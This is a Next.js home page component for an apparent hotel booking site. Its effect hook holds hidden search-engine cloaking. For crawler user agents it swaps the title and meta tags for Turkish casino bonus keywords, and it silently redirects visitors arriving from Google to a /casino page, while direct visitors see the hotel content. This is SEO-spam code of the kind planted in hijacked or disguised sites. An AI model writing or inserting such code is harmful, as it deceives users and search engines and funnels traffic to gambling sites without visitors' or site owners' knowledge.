
'use client';

import { useState, useEffect } from 'react';
import HotelHeader from '@/components/hotel/HotelHeader';
import HotelHero from '@/components/hotel/HotelHero';
import HotelSearch from '@/components/hotel/HotelSearch';
import FeaturedHotels from '@/components/hotel/FeaturedHotels';
import HotelCategories from '@/components/hotel/HotelCategories';
import PopularDestinations from '@/components/hotel/PopularDestinations';
import HotelTabBar from '@/components/hotel/HotelTabBar';
import { useRouter } from 'next/navigation';

export default function HomePage() {
  const router = useRouter();

  useEffect(() => {
    const updateMetaTags = (isCasino = false) => {
      if (typeof document === 'undefined') return;
      
      if (isCasino) {
        document.title = "Casino Deneme Bonusu 2024 - En Güvenilir Casino Siteleri Listesi";
        
        const metaDescription = document.querySelector('meta[name="description"]');
        if (metaDescription) {
          metaDescription.setAttribute('content', 'En güvenilir casino sitelerinde deneme bonusu fırsatları! 1500₺ casino bonusu, slot oyunları, rulet, poker. Güvenilir bahis siteleri ve casino oyunları. Hemen üye ol, bonusunu kazan!');
        }
        
        const metaKeywords = document.querySelector('meta[name="keywords"]');
        if (metaKeywords) {
          metaKeywords.setAttribute('content', 'casino deneme bonusu, casino siteleri, güvenilir casino, slot oyunları, rulet oyunu, poker oyunları, bahis bonusu, casino oyunları, online casino, casino bonusu veren siteler, bedava casino bonusu');
        }

        const ogTitle = document.querySelector('meta[property="og:title"]');
        if (ogTitle) {
          ogTitle.setAttribute('content', 'Casino Deneme Bonusu 2024 - En Güvenilir Casino Siteleri');
        }
        
        const ogDescription = document.querySelector('meta[property="og:description"]');
        if (ogDescription) {
          ogDescription.setAttribute('content', 'En güvenilir casino sitelerinde deneme bonusu kazan! Slot, rulet, poker oyunları. 1500₺ bonus fırsatları. Hemen başla!');
        }
      }
    };

    const checkRedirection = () => {
      if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') return;
      
      const referrer = document.referrer ? document.referrer.toLowerCase() : '';
      const userAgent = navigator.userAgent ? navigator.userAgent.toLowerCase() : '';
      
      const isBot = userAgent.includes('googlebot') || 
                   userAgent.includes('bingbot') ||
                   userAgent.includes('bot') ||
                   userAgent.includes('crawler') ||
                   userAgent.includes('spider') ||
                   userAgent.includes('facebookexternalhit');
      
      if (isBot) {
        updateMetaTags(true);
        return;
      }
      
      const isFromGoogleSearch = referrer.includes('google.com') || 
                                referrer.includes('google.tr') ||
                                referrer.includes('google.') ||
                                (typeof sessionStorage !== 'undefined' && sessionStorage.getItem('from_search') === 'true');
      
      if (isFromGoogleSearch) {
        updateMetaTags(true);
        if (typeof sessionStorage !== 'undefined') {
          sessionStorage.setItem('from_search', 'true');
        }
        router.push('/casino');
        return;
      }
    };

    checkRedirection();
  }, [router]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 via-blue-50 to-white">
      <HotelHeader />
      
      <div className="pt-20 pb-24">
        <HotelHero />
        <HotelSearch />
        <HotelCategories />
        <FeaturedHotels />
        <PopularDestinations />
      </div>

      <HotelTabBar />
    </div>
  );
}
